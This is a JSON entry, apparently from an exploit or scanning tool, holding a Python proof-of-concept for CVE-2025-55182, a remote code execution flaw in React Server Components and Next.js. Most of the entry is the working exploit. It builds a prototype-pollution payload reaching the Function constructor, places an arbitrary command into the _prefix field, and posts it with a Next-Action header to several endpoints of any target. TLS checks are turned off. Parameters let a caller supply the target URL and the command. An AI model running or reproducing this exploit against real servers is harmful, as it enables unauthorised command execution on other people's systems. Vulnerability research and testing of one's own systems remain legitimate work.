{
  "name": "CVE-2025-55182 - React Server Components RCE",
  "description": "針對 React Server Functions 的遠程代碼執行漏洞，影響 Next.js 等使用 React Server Components 的應用。此漏洞允許通過不安全的原型引用在 React Server Functions 中執行遠程代碼。\n\n參考資料：\n- https://github.com/msanft/CVE-2025-55182\n- CVE-2025-55182 影響 React Server Components，特別是 Next.js 應用\n- 漏洞原理：通過原型污染和 thenable 對象實現 RCE",
  "type": "rsc",
  "language": "python",
  "script": "#!/usr/bin/env python3\n\"\"\"\nCVE-2025-55182 PoC - React Server Components RCE\nReference: https://github.com/msanft/CVE-2025-55182\n\nThis vulnerability allows RCE in React Server Functions through insecure prototype references.\n\"\"\"\n\nimport json\nimport requests\nimport sys\nfrom urllib.parse import urljoin\n\ndef create_payload(command):\n    \"\"\"\n    Create the RCE payload for CVE-2025-55182\n    \"\"\"\n    crafted_chunk = {\n        \"then\": \"$1:__proto__:then\",\n        \"status\": \"resolved_model\",\n        \"reason\": -1,\n        \"value\": json.dumps({\"then\": \"$B0\"}),\n        \"_response\": {\n            \"_prefix\": f\"{command}\",\n            \"_formData\": {\n                \"get\": \"$1:constructor:constructor\",\n            },\n        },\n    }\n    \n    files = {\n        \"0\": (None, json.dumps(crafted_chunk)),\n        \"1\": (None, '\"$@0\"'),\n    }\n    \n    return files\n\ndef exploit(target_url, command=\"whoami\"):\n    \"\"\"\n    Exploit CVE-2025-55182 on target URL\n    \"\"\"\n    try:\n        # Normalize URL\n        if not target_url.startswith(('http://', 'https://')):\n            target_url = f\"https://{target_url}\"\n        \n        # Remove trailing slash\n        target_url = target_url.rstrip('/')\n        \n        # Try common Next.js action endpoints\n        endpoints = [\n            f\"{target_url}/\",\n            f\"{target_url}/api\",\n            f\"{target_url}/_next/static\",\n        ]\n        \n        payload = create_payload(command)\n        \n        headers = {\n            \"Next-Action\": \"foo\",\n            \"Content-Type\": \"multipart/form-data; boundary=----WebKitFormBoundary\",\n        }\n        \n        for endpoint in endpoints:\n            try:\n                response = requests.post(\n                    endpoint,\n                    files=payload,\n                    headers=headers,\n                    timeout=10,\n                    verify=False,\n                    allow_redirects=True\n                )\n                \n                if response.status_code in [200, 500]:\n                    # Check if we got a response that indicates execution\n                    if \"SyntaxError\" in response.text or \"function\" in response.text.lower():\n                        return {\n                            \"vulnerable\": True,\n                            \"status_code\": response.status_code,\n                            \"tested_url\": endpoint,\n                            \"final_url\": response.url,\n                            \"response_preview\": response.text[:200],\n                        }\n            except requests.exceptions.RequestException as e:\n                continue\n        \n        return {\n            \"vulnerable\": False,\n            \"status_code\": None,\n            \"tested_url\": target_url,\n            \"error\": \"No vulnerable endpoint found\",\n        }\n        \n    except Exception as e:\n        return {\n            \"vulnerable\": None,\n            \"status_code\": None,\n            \"tested_url\": target_url,\n            \"error\": str(e),\n        }\n\ndef main():\n    \"\"\"\n    Main function - can be called from API wrapper\n    \"\"\"\n    if len(sys.argv) < 2:\n        print(json.dumps({\"error\": \"Usage: python poc.py <target_url> [command]\"}))\n        sys.exit(1)\n    \n    target_url = sys.argv[1]\n    command = sys.argv[2] if len(sys.argv) > 2 else \"whoami\"\n    \n    result = exploit(target_url, command)\n    print(json.dumps(result, indent=2))\n\nif __name__ == \"__main__\":\n    main()\n",
  "enabled": true,
  "parameters": {
    "target_url": {
      "type": "string",
      "required": true,
      "description": "目標 URL（例如：https://example.com）"
    },
    "command": {
      "type": "string",
      "required": false,
      "default": "whoami",
      "description": "要執行的命令（僅用於測試，實際使用時請謹慎）"
    }
  }
}

